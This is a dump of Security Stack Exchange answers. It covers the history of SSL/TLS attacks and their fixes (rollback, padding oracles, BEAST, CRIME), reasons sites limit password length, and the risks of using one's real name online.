This is important in the context of (old) HTTP, where some data can be sent by the server without an explicit "content-length": the data extends until the end of the transport stream. Old HTTP with SSLv2 (which did not have the close_notify) allowed an attacker to force a connection close (at the TCP level) which the client would have taken for a normal close; thus, the attacker could truncate the data without being caught. This is one of the problems with SSLv2 (arguably, the worst) and SSLv3 fixes it. Note that "modern" HTTP uses "Content-Length" headers and/or chunked encoding, which is not vulnerable to such truncation, even if the SSL layer allowed it. Still, it is nice to know that SSL offers protection on closure events.

Attacks

There is a limit on Stack Exchange answer length, so the description of some attacks on SSL will be in another answer (besides, I have some pancakes to cook). Stay tuned.
AnswerKenntnis:
After the lengthy presentation of SSL in the previous answer, let's go with the fun stuff, namely:

Attacks on SSL

There have been many attacks on SSL, some building on implementation errors, others on true protocol weaknesses.

One must remember that while SSL is one of the most attacked protocols (since it is very high profile: a successful application to SSL looks very nice in the abstract of a research article), SSL is also one of the most repaired protocols. It is to be considered to be robust precisely because all known ways to attack transport protocols have been tried on SSL, and SSL has been patched where appropriate.

Version Rolback

In the early days of SSLv3, SSLv2 was still widely used, and therefore clients were commonly sending SSLv2-compatible ClientHello messages, which merely indicated that SSLv3 was supported as well; the server would then take the hint and respond in SSLv3+ dialect (see annexe E of RFC 2246 for details). Since SSLv2 had weaknesses, it was in the best interest of the attacker to arrange for a client and server, both knowing SSLv3, to nonetheless talk with each other using SSLv2. This is called a version rollback attack. The concept formally extends to later versions as well.

Kludges have been added to detect rollback attempts. For the back-to-SSLv2 rollbacks, a client who knows SSLv3+ should employ a special padding for the RSA encryption step (SSLv2 supported only RSA-based key exchange): in PKCS#1, the data which is to be encrypted is supposed to be padded with a number of random bytes; an SSLv3-aware client is then supposed to set the last eight of these padding bytes to the fixed value 0x03. The server then checks these bytes; if the eight 0x03 are found, then a rollback is most probably attempted, and the server rejects the attempt (an SSLv2-only client has probability only 255-8 to use such padding bytes out of sheer lack of luck, so false positives occur at a negligible rate).

For rollbacks to an old version of SSL/TLS, but not older than SSLv3, another kludge was added: in the pre-master secret of 48 bytes which the client encrypts with the server's RSA key, the first two bytes are not random, but should equal the "maximum supported protocol version" which the client wrote first in its ClientHello message. Unfortunately, some clients got it wrong, and this kludge works only with a RSA-based key exchange, so the protection against rollback is very limited there. Fortunately, SSLv3+ has another, much more powerful protection against rollbacks, which is that the handshake messages are hashed together when the Finished messages are built. This protects against rollbacks, unless the "old version" would be so thoroughly weak that the attacker could totally break the whole encryption before the end of the handshake itself. This has not happened yet (SSLv3 is still reasonably robust).

Weak Cipher Suites

Some of the standard cipher suites are intentionally weak in some way. There are:


some cipher suites with no encryption at all, only integrity check, e.g. TLS_RSA_WITH_NULL_SHA;
some cipher suites with 40-bit encryption, such as TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 (cipher suites meant to comply with the stringent US export rules from last century -- these regulations have been mostly lifted at the end of the Bill Clinton era);
some cipher suites with 56-bit encryption, such as TLS_RSA_WITH_DES_CBC_SHA. 56-bit DES is breakable with existing technology, but that's still a bit hard for an amateur (even a bored student with access to a few hundred university machines), so I tend to qualify 56-bit DES as "medium strength".


This opens the road to a variant of version rollback attacks, in which the attacker forces client and server to agree on a weak cipher suite, the idea being that the attacker modifies the list of cipher suites announced by the client. This is workable for the attacker if the selected cipher suite is so weak that he can break it in order to recompute an apparently correct Finished message. Actually, the MAC used in SSLv3+ (even when based on MD5) is robust enough to prevent that. So no actual worry here. Also, my opinion is that any real weakness here is when a client or a server accepts to use a weak cipher suite at all.

By default, modern Web browser do not allow the use of such weak cipher suites.

Private Key Theft

If a SSL connection uses RSA key exchange, and an attacker keeps a copy of the records, and then later on (possibly months after, possibly by inspecting all backups on discarded hard disks or tapes) obtains a copy of the private key, then he can unravel the handshake and decrypt the data.

Perfect Forward Secrecy is about countering this "later on". You get it by using the DHE cipher suites. With a DHE cipher suite, the actual private key which could be used to unravel the handshake is the ephemeral Diffie-Hellman key, not the server's RSA (or DSS) private key. Being ephemeral, it existed only in RAM, and was never written to the hard disk; as such, it should be much more resilient to ulterior theft.

So the lesson is: as a rule, try to use a DHE cipher suite if possible. You should still mind your backups and not let your private key leak, but, at least, the DHE suites make such leakage a bit less of an issue, especially if it happens after the end of the key lifetime (i.e. the corresponding certificate is no longer valid).

Certificate Woes

The whole certificate business is a sore spot in SSL.

Technically, SSL is quite independent from X.509. The certificate chains are exchanged as opaque blobs. At some point, the client must use the server's public key, but the client is free to "know" that key in any way that it sees fit. In some specific scenarios where SSL can be used, the client already knows the server's public key (hardcoded in the code) and just ignores the certificate sent by the server. Nevertheless, in the common case of HTTPS, the client does validation of the server's certificate chain as described in X.509 (read it at the expense of your sanity; you have been warned).

This yields a number of attack vectors, for instance:


Validation entails verifying that the certificates are still valid at the current date. How does the client machine knows the current date ? By its internal clock, and possibly by talking with NTP servers (in a quite unprotected way !). The client could be off by several minutes, hours, days, even years (I have seen it), and, to some extent, a powerful attacker could force it by fiddling with NTP messages. This would allow the attacker to use obsolete certificates which have been revoked years ago. Note a fun fact: the SSL "client random" and "server random" should contain 28 random bytes and the local date and time (over 4 bytes). This inclusion of time was meant to be part of a workaround against time-based attacks. I am not aware of any implementation which really checks it.
Up to circa 2003, the implementation of certificate validation in Internet Explorer / Windows did not process the "Basic Constraints" extension properly. The net effect was that anybody with a 100$ certificate could act as a CA and issue "certificates" with arbitrarily chosen name and keys.
X.509 includes a damage containment feature called revocation: this is about publishing list of banished certificates, which look good, cryptographically speaking, but should not be trusted (e.g. their private key was stolen, or they contain an erroneous name). Revocation works only as far as the involved parties (i.e. browsers) accept to download mammoth revocation lists (which can be several megabytes long !) or to contact OCSP servers. Modern browsers now do it, but a bit reluctantly, and many will accept to connect anyway if they could not obtain revocation status information in a timely fashion (because the human user is not patient). The overall situation improves over the years, but quite slowly.
Some root CA did commit some blunders in the past (e.g. Comodo and DigiNotar). This resulted in issuance of fake certificates (the name is www.microsoft.com but the private key is not in the hand of Microsoft at all...). These blunders were discovered, and the certificates revoked, but it still raises some uncomfortable questions (e.g. are there other CA who had such problems but did not reveal them, or, even worse, never noticed them ?).


X.509 is a very complex assembly of algorithms, technologies, specifications and committees, and it is very hard to get it right. Trying to decode X.509 certificates "by hand" in an unprotected programming language like C is an easy way to obtain buffer overflows.

Bleichenbacher Attacks

Daniel Bleichenbacher found in 1998 a nice attack against RSA. When you encrypt a piece of data with RSA (as occurs for the ClientKeyExchange message in SSL), the data which is to be encrypted must be padded in order to make a byte sequence of the same length as the RSA modulus. The padding consists mostly of random bytes, but there is a bit of structure (notably, the first two bytes after padding must be 0x00 0x02).

Upon decryption (on the server, then), the padding must be found and removed. It so happens that, at that time, when the server decrypted but obtained an invalid padding (the 0x00 0x02 bytes were not there), then it reported it with an alert message (as per the SSL specification), whereas a valid padding resulted in the server using the seemingly decrypted value and keeping on with the handshake.

This kind of things is known as a padding oracle. It allows an attacker to send an arbitrary sequence of bytes as if it was an encrypted pre-master secret, and know whether the decryption of that sequence would yield a valid padding or not. That's a mere 1-bit information, but it is sufficient to recover the private key with a few millions of requests (with cunningly crafted "encrypted" strings).

Workaround: when the decryption results in an invalid padding, the server keeps on using a random pre-master secret. The handshake will then fails later on, with the Finished messages. All current implementations of SSL do that.

The Padding Oracle Strikes Back

Another area where a padding oracle was found is in the records themselves. Consider CBC encryption and HMAC. The data to encrypt is first MACed, then the result is encrypted. With CBC encryption, the data to be encrypted must have a length which is a multiple of the block size (8 bytes for 3DES, 16 bytes for AES). So some padding is applied, with some structure.

At that time (the attack was found out by Vaudenay in 2002), when a SSL implementation was processing a received record, it returned distinct alert messages for these two conditions:


Upon decryption, no valid padding structure was found.
Upon decryption, a valid padding was found, but then the MAC was verified and it did not match.


This is a padding oracle, and that can be used to recover some encrypted data. It requires an active attacker, but it is not that hard. Vaudenay implemented it, and it was extended to the case where a modified SSL implementation returned the same alert message in both case, but was slightly slower to do it in the second case, because of the time taken to recompute the MAC (a nice demonstration of a timing attack).

Because people never learn, the Microsoft implementation of SSL used in ASP.NET was still unpatched as of 2010 (eight years later !) when Rizzo and Duong reimplemented the Vaudenay attack and built a demonstration which recovered HTTP cookies.

See this page for some pointers. One must note that if SSL had used encrypt-then-MAC, such problems would have been avoided (the faulty records would have been rejected at the MAC level, before even considering decryption).

BEAST

The BEAST attack is again from Duong and Rizzo, and, again, it is a remake of an older attack (from Philip Rogaway in 2002). To get the idea, consider CBC. In this mode of operation, each block of data is first XORed with the result of the encryption of the previous block; and that's the result of the XOR which is encrypted. This is done in order to "randomize" the blocks and to avoid the leaks which are found with ECB mode. Since the first block does not have a "previous" block, there must be an Initialization Vector, which plays the role of previous block for the first block.

It turns out that if an attacker can control part of the data which is to be encrypted, and also can predict the IV which will be used, then he can turn the encryption machine into yet another decryption oracle and use it to recover some other encrypted data (that the attacker does not choose). However, in SSLv3 and TLS 1.0, the attacker can predict the IV for a record: it is the last block of the previous record ! So the attacker must be able to send some data in the stream, in order to "push" the target data, at a point where the implementation built and sent the previous record (typically when 16 kB worth of data have been accumulated), but did not begin to build the next one.

TLS 1.1+ is protected against that, because in TLS 1.1 (and subsequent versions), a per-record random IV is used. For SSLv3 and TLS 1.0, a workaround is to send zero-length records: that is, records with a payload of length zero -- but with a MAC and padding and encryption, and the MAC is computed from a secret key and over the sequence number, so this plays the role of a random number generator. Unfortunately, IE 6.0 chokes on zero-length records. Other strategies involve a 1/n-1 split (a n bytes record is sent as two records, one with a single byte of payload, the other with the remaining n-1).

Another workaround is to force the use of a non-CBC cipher suite when possible -- the server selects an RC4-based cipher suite if there is one in the list of cipher suites sent by the client, even if the client would have preferred a CBC-based cipher suite. This tool can tell you if a given server apparently acts like that. (Note: BEAST is an attack on the client, but, by selecting an RC4 cipher suite, the server can protect a careless client.)

See this page for some pointers. While TLS 1.1 is from 2006, the BEAST attack may force the browser vendors to finally upgrade.

CRIME

As for any Hollywood franchise, Duong and Rizzo published in 2012 the sequel of the sequel. CRIME exploits a leakage which was theorized years ago, but as vividly demonstrated as in the demonstration they recently published. CRIME exploits compression, in the same setup than the BEAST attack (attacker can send some data of its own in a SSL connection, where interesting target data such as a cookie is also sent). Roughly speaking, the attacker puts in its data a potential value for the target string, and, if it matches, compression makes the resulting records shorter. See this question for a (pre-cognitive) analysis.

CRIME is avoided by not using TLS-level compression at all, which is what browsers now do. Internet Explorer and IIS never implemented TLS-level compression in the first place (for once, sloppiness saved the day); Firefox and Chrome implemented it, and deactivated this summer (they were forewarned by Duong and Rizzo, who are quite responsible in their activity).

CRIME shows why I wrote, near the beginning of my SSL explanations:


  SSL fulfills these goals to a large (but not absolute) extent.


Indeed, encryption leaks the length of the encrypted data. There is no known good solution against that. And length alone can reveal a lot of things. For instance, when observing with a network monitor a SSL connection, we can spot the "extra handshakes" within the stream (because the first byte of each record identifies the type of data in the record, and it is not encrypted); with the lengths of the records, it is pretty easy to see whether the client provided a certificate or not.

The Future

Humans never learn. There is a lot of pressure to add nifty extensions to SSL for a lot of reasons which always look good at the beginning, but can induce extra problems.

Consider, for instance, SSL FalseStart. Mainly, this is about the client sending its application data right after having sent its Finished message (in a full handshake), without waiting for the Finished message from the server. This reduces latency, which is good and well-intentioned. However, it changes the security situation: before having received the Finished message from the server, the latter is only implicitly authenticated (the client has no proof yet that the intended server was really involved at all; it just knows that whatever it sends will be readable only by the intended server). This can have impacts; for instance, an attacker could emulate the server up to that point and force, e.g., the client to use a CBC-based cipher suite or TLS compression. Therefore, if a client implements FalseStart, then it decreases effectiveness of protection measures against BEAST and CRIME, as could otherwise be enforced by the server.

(Google disabled FalseStart this spring, apparently because of compatibility issues with some servers. Anyway, the "30% latency reduction" looked weird, because FalseStart would have some influence only on full handshakes, not abbreviated handshakes, so I don't believe in these alleged benefits; not to that magnitude, at least.)
QuestionKenntnis:
What technical reasons are there to have low maximum password lengths?
qn_description:
I have always wondered why so many websites have very firm restrictions on password length (exactly 8 characters, up to 8 characters, etc). These tend to be banks or other sites I actually care about security.

I understand most people will pick short passwords like "password" and "123456" but are there technical reasons to force this? Using an application like 1Password, almost all my passwords are something like fx9@#^L;UyC4@mE3<P]uzt or other randomly generated long strings of unlikely to guess things.


Are there specific reasons why websites enforce strict bounds on password lengths (more like 8 or 10, I understand why 100000000 might be a problem...)?
AnswersKenntnis
AnswerKenntnis:
Take five chimpanzees. Put them in a big cage. Suspend some bananas from the roof of the cage. Provide the chimpanzees with a stepladder. BUT also add a proximity detector to the bananas, so that when a chimp goes near the banana, water hoses are triggered and the whole cage is thoroughly soaked.

Soon, the chimps learn that the bananas and the stepladder are best ignored.

Now, remove one chimp, and replace it with a fresh one. That chimp knows nothing of the hoses. He sees the banana, notices the stepladder, and because he is a smart primate, he envisions himself stepping on the stepladder to reach the bananas. He then deftly grabs the stepladder... and the four other chimps spring on him and beat him squarely. He soon learns to ignore the stepladder.

Then, remove another chimp and replace it with a fresh one. The scenario occurs again; when he grabs the stepladder, he gets mauled by the four other chimps -- yes, including the previous "fresh" chimp. He has integrated the notion of "thou shallt not touch the stepladder".

Iterate. After some operations, you have five chimps who are ready to punch any chimp who would dare touch the stepladder -- and none of them knows why.



Originally, some developer, somewhere, was working on an old Unix system from the previous century, which used the old DES-based "crypt", actually a password hashing function derived from the DES block cipher. In that hashing function, only the first eight characters of the password are used (and only the low 7 bits of each character, as well). Subsequent characters are ignored. That's the banana.

The Internet is full of chimpanzees.
AnswerKenntnis:
These restrictions are often put in place for various reasons:


Interaction with legacy systems that do not support long passwords.
Convention (i.e. "we've always done it that way")
Simple naivety or ignorance.


As far as security goes, there is no need to limit password lengths. They should be hashed anyway, using a KDF such as bcrypt. To help with performance, it might be worth placing a very large limit (e.g. 512 characters) on the password length, to prevent someone sending you a 1MB password and DoS'ing your server for 10 seconds whilst it computes the hash.
AnswerKenntnis:
If they store it in plaintext or encrypted plaintext, then that's probably the maximum value that can be stored in the DB. On the other hand one should get as far as possible from these sites
To avoid DOS attacks. This is usually if they have a very high limit, like 512 or 1024 bytes
To comply with regulations that are actually made by people not knowing anything about IT security
For legacy reasons, as Tom Leek has pointed out


Btw. here is a (historical) list of high ranking sites having maximum password lengths:

http://web.archive.org/web/20130907182806/https://defuse.ca/password-policy-hall-of-shame.htm
AnswerKenntnis:
I would cite an attempt to reduce customer service related issues. 

The larger and more complex a passwords is the higher the likelihood for the customer to enter invalid password, get locked out and then contact customer service tying up that individual's time. 

It is amazing how many people are unable to accurately type a normal weak password, let alone a password that is a few characters longer or had to have an extra character or 2 injected for complexity. 

Possibly OT but, lengthy passwords are not necessarily a guaranteed true security measure since passwords are straight-out stolen on a fairly common basis now-a-days. 

Failed login attempts and Tracking geo-distance from normal login usage is far more accurate metric. if a IP belonging to a known high hacking/attack profile country logs into an American bank and that login has never been used from that location before..... 

A lot of high profile places such as SF/banks generally have a very low failed login attempts count with resulting system wide lockdowns. Some such as SF go as far as doing individual IP allocation, which means you can't login from a new IP address without authorizing it.
AnswerKenntnis:
I asked this question at Bol.com, one of the biggest webshops in the Netherlands. Their response was to prevent being flooded with support emails about forgotten passwords. They then curiously ignored my inquiry about the password reset feature which just emails you a reset link when you have forgotten your password.

I've concluded that it's most likely a decision from the management team. Alternatively it might be that they don't hash passwords and use this to prevent their database from being flooded (even though you can have a longer username, so this seems unlikely). They also did not respond to a question about whether they hash passwords (you'd think if everything is alright there would be no reason not to reply).
AnswerKenntnis:
"Interaction with legacy systems that do not support long passwords." as mentioned above is the reason for one company I worked at to enforce a maximum password length.

As a variation on the trope "a group moves as fast as its slowest member" the use of multiple systems which all users had to have access to using the same login credentials meant that any restriction by one of those systems would then have to be applied to all accounts.

So if one application a didn't like ^ then all passwords for all systems couldn't have a ^. If one program didn't like passwords > 8 chars then all accounts had to have passwords < 9 chars. So in a complex environment like BigCo where I worked this might involve a dozen or two dozen different pieces of software; the LCD was what everyone got.

They used IE6 as well.
AnswerKenntnis:
A password length limit is reasonable as long as that limit still allows for strong passphrases; e.g., the limit isn't less than 64 characters.  A loud limit when setting the password is significantly better than silently truncating the password.

If the application ultimately stores the password with 128 bit (hopefully salted and key-stretched) hash, there's no gain in allowing passwords longer than ~64 characters.  E.g., with a diceware passphrase with 5 character words with spaces between them, a 64 character passphrase allows 10 words which would have an entropy of more than 128 bits.

A developer potentially could be worried about SQL injection or buffer overflow attacks injected via the password field -- granted you should use the standard methods to prevent these attacks: always use bound parameters with SQL (versus string manipulation to construct queries) and always properly bounds check your strings (possibly by using a safe programming languages or safe libraries with built in protections).  You need to be worried about these attacks on all user input; this is not unique to the password field so the protection gained by a maximum password size is likely negligible.

There could be tangential reasons for limits as well.  A bank that gives users ATM cards with a PIN (personal identification number) may choose to force users to use PINs between 4-10 digits in length.  Allowing a user to set and use a 50 digit PIN likely would have little security gain in practice over say a 8 digit PIN - when an attacker needs both a user's ATM card (that hasn't been called in as stolen), use a monitored ATM, and gets locked out after 4 wrong attempts.  A 50 digit PIN, could be more expensive in human costs for your bank, as it would be forgotten/input incorrectly more frequently - maybe trigger an employee to investigate (e.g., check the ATM video and compare with previous successful transactions) or have an employee walk the customer through some necessarily lengthy password reset mechanism (e.g., the reset mechanism has to be costly so it is not the weakest link).  This whole process could lead to poor customer user experience which the bank wants to avoid.
AnswerKenntnis:
Another possibility I'd like to address that hasn't already is that passwords are sometimes limited by the length of the field that is used to save them, when saved in plain-text. If you field is a VARCHAR(32), then you can save 32 characters at most.

However, this means something even worse - that the password is saved in plain-text. This is why we accept these sorts of offenses as (lightweight) evidence at plaintextoffenders.com.
AnswerKenntnis:
As others have already noted, the big reason that comes up for 8 characters or less is dealing with older systems that don't support anything longer than that.

Then there is the general good idea of placing some upper bound on what is reasonable.  Lets say that is 500 characters.  It wouldn't be unreasonable to think anyone providing more than 500 characters for a password might be up to no good.

But even if you are using a currently recommended password hashing system there are still limits.  Bcrypt, which is widely used and from what I can tell generally considered a good/strong option for hashing passwords, only deals with the first 72 characters.  Anything beyond 72 characters is thrown away.  If my password is 100 characters long and yours is 150, if they start with the same 72 characters bcrypt will consider them the same.

Given that specific limit in bcyrpt, if you are using bcrypt you may want to enforce a 72 character limit to make sure that all unique passwords are actually considered unique by your authentication system.
AnswerKenntnis:
Many sites think it is not needed to have long password since there is brute-force protection (like limiting number of login attempts per IP), which makes very little difference to have long vs short passwords, in both cases it would take years to try all possible combinations.

The one recomndation would be to use random characters (!@#$%^&*-_=+/\'") a long with a-z A-Z 0-9.
AnswerKenntnis:
I'd say there are three main reasons:


Legacy systems not supporting special characters
The desire to keep support overhead down, and use of the system up, by keeping users' passwords actually rememberable. In other words, if you let users make and use paswords they can't remember, they will, and as a result they'll either annoy you about it or stop using the site due to the hassle
Developers not wanting to have to worry about parsing special characters from untrusted users, which could potentially be dangerous


In the past the top reason was probably the lack of ability to support the passwords (#1), and today it's probably the lack of desire to support them--mostly from #2, but partially from #3.
AnswerKenntnis:
With additional restrictions (generally, only numbers accepted), it can also be motivated by the fact it allows (or may allow, if some day the need would arise) entering the password through some interface with limited capacities...

That's why many banks have set such restrictions for web access passwords, to allow access through legacy systems which only have numerical keypads (ATMs, phones...)
AnswerKenntnis:
Too long passwords create security weaknesses:


they have to be kept by our human memory (I'm considering here password which have an authentication value because they are something you know.
The case of passwords never produced from memory, for example stored in a software safe, is a completly different story).

ΓçÆ typing and memory errors probability increases with the length of
 passwords
their clear version exposure risk is increasing with length

ΓçÆ long passwords increase the possibility of guessed clear text 
 cryptanalysis


All in all, the vulnerability of a password is a probability function p (of password being exposed) of length n of the password (among other parameters like the cardinal of the alphabet used). This function p has 2 clear mathematical limits:


  lim p(n) = 1
  nΓåÆ0

  lim p(n) = 1
  nΓåÆΓê₧


In between, p reaches a minimum (lowest probability for a password of length n to get exposed, failing or cracked) which depends of our memory. I estimate this minimum to be reached between 8 and 32.

Just try to memorize a good password of 16 characters to see where this minimum of risk might be Γÿ║.

In real life we all know that the longer is a key (of a car or appartment)
the more complex it is and the safer it is against pickingΓÇª
up to a practical limit.
The guy with a 10 inches long car key doesn't live in this same world to defend his arguments.
QuestionKenntnis:
Is it bad practice to use your real name online?
qn_description:
On some accounts I use my real name on-line (Google+/Facebook/Wikipedia/personal blog), others (Q&A/Gaming) I use an alias.

My question is: Security and privacy wise, what can people do with my real name? What are the dangers of using your real name on-line.
AnswersKenntnis
AnswerKenntnis:
This is actually an interesting new field in infosec - reputation management.


Employers, Law Enforcement and other government agencies, legal professionals, the press, criminals and others with an interest in your reputation will be observing all online activity associated with your real name. 
These "interested parties" (snoops) are usually terrible at separating professional and personal life, so you could be made to suffer for unpopular opinions, political or religious convictions, associates or group affiliations they consider "unsavory", and any behavior that can be interpreted in the most uncharitable light. (Teachers have been forced to resign for drinking wine responsibly while vacationing in Europe. No, really.)
Conversely, you need an online presence, otherwise you will be made to suffer for a lack of things for the snoops to spy on - employers, especially (from Forbes): 



  Key takeaway for hiring employers: The Facebook page is the first
  interview; if you donΓÇÖt like a person there, you probably wonΓÇÖt like
  working with them. The bad news for employers, though, who are hoping
  to take the Facebook shortcut: ΓÇ£So many more profiles are restricted
  in what the public can access,ΓÇ¥ says Kluemper.



You must carefully balance your public and private personas. Give as little information as possible in your public persona, and be mindful that unknown entities who may be antagonistic toward you will look to use whatever you put online against you. For instance - you announce you're going to visit relatives for the weekend! Robbers and vandals may take notice (from Ars Technica:)



  39-year-old Candace Landreth and 44-year-old Robert Landreth Jr.
  allegedly used Facebook to see which of their friends were out of
  town. If a post indicated a Facebook friend wasn't home, the two broke
  into that friend's house and liberated some of their belongings.



Social media companies such as Facebook and Google have proven to be hostile to the notion of privacy, and continually change their terms of service and "privacy settings" without consent to share more and more of your information with others. You cannot rely on them to protect your public reputation from your personal life. From NBC:



  The Internet search giant is changing its terms of service starting
  Nov. 11. Your reviews of restaurants, shops and products, as well as
  songs and other content bought on the Google Play store could show up
  in ads that are displayed to your friends, connections and the broader
  public when they search on Google.
  
  The company calls that feature "shared endorsements.''



It is best to offer information of a more personal nature pseudonymously, and keep the pseudonym(s) carefully firewalled from your real identity. Avoid major social media services when participating online pseudonymously if at all possible.
AnswerKenntnis:
Using your real name does not cause any harm to you. It is not true that you have to pay for any bad deed done by a bad person who misused your name.

So, using your real name online is not a bad practise, it depends on your wish. But the information you share is the real key.

Let us say that you have a blog or social network account with your real name. And you are sharing your informations like the places you work/live, your likes/dislikes, your school/college/degree informations,your photos, etc., it is an unending list.

These information can give a overall picture of you ( of your real name). So there is a high possibility of an attacker(if you are targetted) misusing your name in such a way that you will have to suffer.

A sample scenario:

Let us assume that the attacker has gathered all of your information from your social network accounts, your personal blogs, etc.,
He creates a social network account with all your information and obviously with your info and picture.

He send requests to the friends listed in your profile. Atleast some of them will accept the request since it represents you.

Then he starts impersonating you in chats,mail and whatever and misbehaving with your friends and eventually your reputation starts spoiling (The worst thing is, you don't even realize whats going on until it becomes a terrible issue). 

After some time, you will face a hard time to prove that it was not you but a fake one.

Bottom Line: Using real name online is not a bad practice; Using your real information may be.

NOTE: I am not saying that you should not share your information online, i am just reminding you that it is at your own risk and there are better chances for getting hacked when you give out more information.
AnswerKenntnis:
Using your real name is not only safe, it's important for you to do so. Just bear in mind that you don't want to simply attach your name to all your activities, you want to build and cultivate your online identity.

Take the sad case of hapless, hopeless Rick Santorum. He was (and possibly still is) a politician with hopes for fame and power and sights on the US Presidency. He also has extreme political views that make him extraordinarily unpopular with most of people; including most tech-savvy people in particular. Rick never cultivated much of an online presence until his presidential campaign made it important to do so.  By then it was too late. Google can tell you the rest.

His case may be an extreme one, but the root of the problem is that no online identity existed until it was created by those he disagreed with. This made it trivial for those people to craft his online image however they wanted. And while it's unlikely his political career would ever have gone anywhere to begin with, this issue helped bring about its early demise.

In other words, Whether or not you ever use your real name online, other people will. And if they're the only people talking about you, theirs is the only message that will be heard.

If you establish a public identity, an authentic identity, your story told first-hand, then others will have a place to look to see the story as told by you. This includes friends, followers, employers, employees, investors, police and investigators, and the curious general public. The more complete and established and extensive your visible identity is, the more credible it becomes. A couple of blog entries and a Google+ profile doesn't cut it.

Just bear in mind that everything you put out there for the world to read you're publishing for the world to read, just like printing it on the front page of the newspaper. Keep yourself safe accordingly, but still say something.
AnswerKenntnis:
Sadly, whether or not to use your real name online may depend on your gender:


One study found "that chat room participants with female usernames received 25 times more threatening and/or sexually explicit private messages than those with male or ambiguous usernames".  
There have been numerous cases of prominent female bloggers being harassed and threatened, such as Kathy Sierra and Anita Sarkeesian. 
Pseudonymous griefer Mikee made "specific threats against LinuxChix posters and advocated sexual violence against and murder of specific individuals".


On a personal note, I have found StackExchange to be a safe environment but have used a gender-neutral handle on the last few forums I joined.
AnswerKenntnis:
Personally, I use my real name online or one of a select few handles that are easily and fairly reliably identified to my real name with a simple Google search.  I also have friends who will give me nothing but their handle even after we've been friends for years.  There is no right or wrong answer, it really comes down to personal comfort with your online and offline worlds colliding.

I chose to use my real identity online because of having several side businesses as well as having worked with a relatively large fan run gaming press site, so my I had a fairly public online presence associated with my real life identity to begin with.  If you Google my name, I'm one of the first few people to come up.  I also don't see Internet "anonymity" as something I personally desire and I manage my reputation online just like I would in real life.

If you don't mind having to be careful to manage your identity and understanding what implications of your actions could be, then it's a great way to build a reputation that is useful both online and off.  There isn't any real risk other than you personally damaging your reputation.

On the flip side, keeping your identity private may prevent some damage from occurring if you don't bother to manage your identity, but then if your identity ever leaks or you ever actually get seriously investigated, your handles aren't going to hold up for long before a real name gets associated with it and the damage is compounded.

Regardless of what you decide about using your real name, the real important thing from both an information security and a personal responsibility stand point is to manage your identity online.  Imagine if everyone in the world knew anything you put online (even if you are posting it for just your friends).  Consider your actions through that light and you'll be fine whatever you decide.
AnswerKenntnis:
TL;DR:
Behave in the same way on the internet as you would in the street outside your house (probably) - be consistent about who you are (you shouldn't have to compromise on your core values), keep your clothes on, don't drive while drunk, don't walk up to a stranger and give them your pin number, take reasonable precautions to ensure your safety, never go to Hillbrow for New Years Eve.

LONG ANSWER:
Well, my answer is different because I live in rural South Africa and nobody here cares if I drank wine in France. More likely, even prospective employers would be asking why I didn't bring them back a bottle. Out here I get commissioned based on who I know (and probably shot a few back with) and the quality of my work.

That said, I follow a few basic principles when it comes to "the online" and my professional career:


Live my life unashamedly and do whatever I want.
Don't want to do anything stupid or embarrassing or "compromising" (nudge, nudge, wink, wink) within range of a camera-phone.
If I don't want it public, don't put it on the interwebs which is by its very nature a "public space". That includes: trolling when I'm having a bad hair day; my ATM pin number; dark secret thoughts.
Don't work with people who I'm likely to have "creative differences" with. This is my number one rule now that I'm older and wiser. I am a libertarian anarchist. No, I don't "mind" "The Gays". Yes, I'm a single mother and no, I won't get married... ever... No, I don't go to church. And the hardest for SAers to comprehend: I.am.a.vegetarian. 

This all makes me as close to heretical/controversial/demon-worshipping as a South African can get to other South Africans. Am I worried someone will find out on www.topsecretvegetarians.com/forum? No. I already told them myself. Do I still get commissions? Yes - because of building offline relationships and the standard of my work. If someone takes exception to my core beliefs, well they can just go and throw new \Exception($themselves) and try and find a better web developer than me (they won't, teehee ^_^).

South Africa (and Africa) has got nice big, wide open spaces for developers. You all should come on over. Bring wine. ;)


So, in answer to your question, I USE MY REAL NAME which is Gaetane le Grange. You can all go and google it now, I'm the only one in the world - thanks mom and dad :/. My nick here is only because it amuses me - links back to my blog with my real name (don't bother looking, I lost interest in it). My facebook: www.facebook.com/gaetane (don't bother looking, I lost interest in it).

When you walk into the street outside your house, you walk out as you (hopefully with all the appropriate bits and pieces tucked in and zipped up, minding the muggers). The internet is just a bigger street (more tucking, bigger zip, automated mugging).
AnswerKenntnis:
First, it's not the same if you have a common or unique name and if your male or female.

Among the danger of using your real name online are stalking, bullying, identity theft, doxxing, etc.

Please note that not using your real name online will not protect you from those, it only makes it a little bit harder and with other protective measure will hopefully allow you to not be one of the low hanging fruits.

If you want some examples of the harm that can be done, research what 4chan does when personal info is posted there and what a human flesh search engine can achieve.

Another less obvious danger of putting your real name publicly online is exposing yourself to cross-referencing. If you used your name to buy an adobe product and the adobe client database is stolen... A secure password policy is key to mitigate this kind of danger.

Then there is reputation, you have to be careful what gets associated to your real name, google has a tendency to return first the stuff that makes you look bad even it's all lies, also once something is online it tends to stay there and resurface at the least appropriate moment.

You could also read the meatball wiki articles  about the use of real names in a wiki and on meatball wiki.
AnswerKenntnis:
A thing to consider is that the answer to your question depends on how common your name is.

For example, there are only a handful of people in the world with my name, so if I use my name, chances are that the name can be correctly traced back to me.

If your name is James Smith, then tracing the use of your name back to you becomes much more difficult.

So the pluses and minuses of using your real name online are diluted as a function of how common a name you have.
AnswerKenntnis:
What you say on line lives forever. The number of miscreants, peer aggressive competitors and general lack of ethics seems a very good reason to keep your thoughts associated with a nom de guerre. Linked-In exists for trading flattery and putting a very professional 'foot' forward for future HR reviews.

A ambiguous photo or post can cost more than imagined in the moment of posting, usually some time later. Given our current wide divergence between political party views, can you really post a cogent argument for either side without potential self-inflicted harm from some future power player with passionately held and conflicting views? While satisfying to declare Public Official A as being a 'corrupt fool', even truth won't protect you from A's like-minded associates. High risk, low value. That's a risk/reward ratio that's upside down and self-defeating, in my view. "Being paranoid doesn't mean you don't have enemies."
AnswerKenntnis:
Using your real name online increases your vulnerability, and constrains your behavior. Being outspoken invites trolling. It's all good fun, until lighthearted harassment and death threats start getting real. You might face 200 pizza deliveries, or wake up to a SWAT raid.

It may also have long-term consequences. Joel Silver notes: "What you say on line lives forever." You don't want stupid things that you said in your youth to ruin your career. You don't want online flirtations to ruin your political career.

It's good practice to use your real name online where appropriate, and to mindfully build a reputation that furthers your goals. For inconsonant or controversial activities, it's prudent to use pseudonyms, and to appropriately manage their reputations. For that to work, adequate compartmentalization is essential.
QuestionKenntnis:
Are passwords stored in memory safe?
qn_description:
I just realized that, in any language, when you save a password in a variable, it is stored as plain text in the memory.

